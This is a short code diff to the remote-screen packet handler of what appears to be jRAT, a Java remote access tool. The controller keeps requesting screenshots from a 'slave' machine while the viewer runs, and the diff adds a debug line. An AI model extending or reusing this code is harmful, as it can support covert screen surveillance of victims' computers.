@@ -5,6 +5,7 @@ import java.io.ByteArrayOutputStream;
 import java.io.DataInputStream;
 
 import su.jrat.client.Cursor;
+import su.jrat.client.Main;
 import su.jrat.client.Slave;
 import su.jrat.client.packets.outgoing.Packet12RemoteScreen;
 import su.jrat.client.ui.frames.FrameRemoteScreen;
@@ -12,9 +13,7 @@ import su.jrat.client.utils.ImageUtils;
 
 
 public class Packet17RemoteScreen extends AbstractIncomingPacket {
-	
-	protected boolean requestMore = true;
-	
+		
 	@Override
 	public void read(Slave slave, DataInputStream dis) throws Exception {
 		FrameRemoteScreen frame = FrameRemoteScreen.instances.get(slave);
@@ -54,7 +53,8 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 			
 			frame.getProgressBar().setValue(0);
 			
-			if (requestMore && frame.isRunning()) {
+			if (frame.isRunning()) {
+				Main.debug("Requesting more");
 				slave.addToSendQueue(new Packet12RemoteScreen(frame.getImageSize(), frame.getQuality(), frame.getMonitor()));
 			}
 		} else {
